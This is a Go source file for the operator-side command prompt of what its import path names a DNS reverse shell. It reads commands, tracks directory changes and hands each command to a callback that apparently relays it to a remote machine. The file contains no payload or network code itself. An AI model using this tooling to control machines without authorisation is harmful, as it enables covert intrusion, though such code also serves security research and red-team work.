package shell

import (
	"bufio"
	"dns-reverse-shell/main/shell/navigation"
	"fmt"
	"os"
	"strings"
)

type Shell struct {
	scanner    *bufio.Scanner
	callbackFn func(string)
	navigator  *navigation.UnixNavigator
	wait       chan bool
}

func NewShell(callbackFn func(string)) *Shell {
	return &Shell{scanner: bufio.NewScanner(os.Stdin), callbackFn: callbackFn, navigator: navigation.NewUnixNavigator(), wait: make(chan bool)}
}

func (s Shell) Start() {
	fmt.Println("Waiting for connection..")
	s.Wait()
	s.printPrompt()
	s.loopScanner()
	if s.scanner.Err() != nil {
		s.handleScannerError()
	}
}

func (s Shell) Wait() {
	<-s.wait
}

func (s Shell) Resume() {
	s.wait <- false
}

func (s Shell) loopScanner() {
	for {
		s.scanner.Scan()
		text := s.scanner.Text()
		if len(text) == 0 {
			break
		}
		s.handleInput(text)
	}
}

func (s Shell) handleInput(text string) {
	if strings.Contains(text, "cd") {
		s.handleNavigationCommand(text)
	} else {
		s.callback(text)
	}
}

func (s Shell) handleNavigationCommand(text string) {
	err := s.navigator.AddNavigationStep(text)
	if err != nil {
		fmt.Println(err)
	}
	s.printPrompt()
}

func (s Shell) callback(text string) {
	navCommand := s.navigator.BuildCommand()
	if len(navCommand) != 0 && text != "exit" {
		s.callbackFn(navCommand + " && " + text)
	} else {
		s.callbackFn(text)
	}
	println("waiting for answer..\n")
	s.Wait()
	s.printPrompt()
}

func (s Shell) printPrompt() {
	path := s.navigator.BuildPath()
	if len(path) != 0 {
		fmt.Print(path + " > ")
		return
	}
	fmt.Print("> ")
}

func (s Shell) handleScannerError() {
	fmt.Println("Error: ", s.scanner.Err())
}
